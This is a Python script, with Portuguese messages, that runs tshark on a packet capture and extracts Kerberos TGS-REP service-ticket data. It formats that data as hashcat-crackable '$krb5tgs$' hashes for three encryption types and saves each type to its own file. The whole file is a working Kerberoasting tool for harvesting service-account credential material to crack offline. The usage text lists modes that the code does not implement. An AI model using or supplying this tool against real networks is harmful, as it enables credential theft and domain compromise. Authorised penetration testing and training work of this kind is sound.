import subprocess
import sys
from collections import defaultdict

if len(sys.argv) < 3:
    print("Uso: python3 krb5_roast_parser_multi.py <arquivo.pcap> <tgs_rep|as_req|as_rep>")
    sys.exit(1)

pcap_file = sys.argv[1]
mode = sys.argv[2]

field_map = {
    "tgs_rep": [
        "-Y", "kerberos.msg_type == 13",
        "-e", "kerberos.CNameString",
        "-e", "kerberos.realm",
        "-e", "kerberos.SNameString",
        "-e", "kerberos.etype",
        "-e", "kerberos.cipher"
    ]
}

output_by_mode = {
    "23": {"prefix": "$krb5tgs$23$", "file": "hashes_13100.txt"},
    "17": {"prefix": "$krb5tgs$17$", "file": "hashes_19600.txt"},
    "18": {"prefix": "$krb5tgs$18$", "file": "hashes_19700.txt"},
}

if mode not in field_map:
    print(f"Modo '{mode}' não suportado.")
    sys.exit(1)

# Executa o tshark
cmd = ["tshark", "-r", pcap_file, "-T", "fields", "-E", "separator=|"] + field_map[mode]
try:
    output = subprocess.check_output(cmd, text=True)
except subprocess.CalledProcessError as e:
    print("Erro ao executar tshark:", e)
    sys.exit(1)

hashes = defaultdict(list)

for line in output.strip().split('\n'):
    parts = line.split('|')
    if len(parts) < 5:
        continue

    username, realm, spn, etype, cipher = [p.strip() for p in parts[:5]]
    if not cipher or len(cipher) < 64 or not etype:
        continue

    etype = etype.split(',')[0]
    if etype not in output_by_mode:
        continue

    # Correção correta de escape de barra invertida
    spn = spn.replace('\\', '/').replace('\\', '/')

    cipher = cipher.split(',')[0].replace(":", "").lower()

    if len(cipher) < 64:
        continue

    checksum = cipher[:32]
    enc_data = cipher[32:]

    prefix = output_by_mode[etype]["prefix"]
    hash_line = f"{prefix}*{username}${realm}${spn}*${checksum}${enc_data}"
    hashes[etype].append(hash_line)

# Salvar hashes por tipo
for etype, lista in hashes.items():
    file_name = output_by_mode[etype]["file"]
    with open(file_name, "w") as f:
        f.write("\n".join(lista))
    print(f"{len(lista)} hash(es) salvos em {file_name}")
